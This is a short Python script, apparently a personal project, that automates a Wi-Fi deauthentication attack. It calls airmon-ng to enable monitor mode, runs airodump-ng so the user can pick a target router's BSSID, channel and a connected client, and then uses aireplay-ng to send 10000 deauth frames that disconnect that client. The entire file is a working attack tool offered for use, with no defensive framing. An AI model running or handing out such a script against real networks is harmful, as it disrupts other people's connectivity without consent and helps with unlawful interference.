#- * - coding: UTF - 8 -*-
import subprocess
import optparse
import time
import pyautogui


print("Hello Everyone Welcome to My Project\n")

def get_user_input():
    parse_object= optparse.OptionParser()
    parse_object.add_option("-i","--interface",dest="interface",help="interface to change!")

    return parse_object.parse_args()


def deauth_attack(interface):

        #Monitor mode on
        print("Loading monitor mode...")
        time.sleep(3)
        subprocess.call(["airmon-ng","start",interface])
        time.sleep(1)
        print(subprocess.call(["iwconfig"]))
        time.sleep(3)
        print("Monitor Mode Succesful")
        time.sleep(2)
        subprocess.call(["clear"])
        time.sleep(2)

        #Net_scanner
        print("!!!İMPORTANT:When you see the modem name, press q 2 times!!!")
        time.sleep(10)
        subprocess.call(["airodump-ng",interface+"mon",])
        time.sleep(3)

        print("LOADİNG...")
        time.sleep(3)
        print("!!! İMPORTANT: Type modem bssid and modem ch in "" quotation marks")
        time.sleep(2)
        modem_bssid=str(input("Enter Your target modem bssid: "))
        modem_ch=(input("Enter Your target modem CH: "))

        time.sleep(5)
        print("!!!İMPORTANT:When you see the modem name, press q 2 times!!!")
        time.sleep(5)
        #Wifi Scanner
        subprocess.call(["airodump-ng","--bssid",modem_bssid,"--channel",modem_ch,interface+"mon"])
        time.sleep(2)
        print('!!! İMPORTANT: Type targetSTATION sin quotation marks')
        targetSTATION = str(input("Enter Your target STATION: "))
        time.sleep(2)
        print("ctrl c to end the attack")
        time.sleep(4)
        #
        subprocess.call(["aireplay-ng", '--deauth','10000', "-a", modem_bssid, "-c", targetSTATION, interface+"mon"])

(user_input,arguments)=get_user_input()

deauth_attack(user_input.interface)
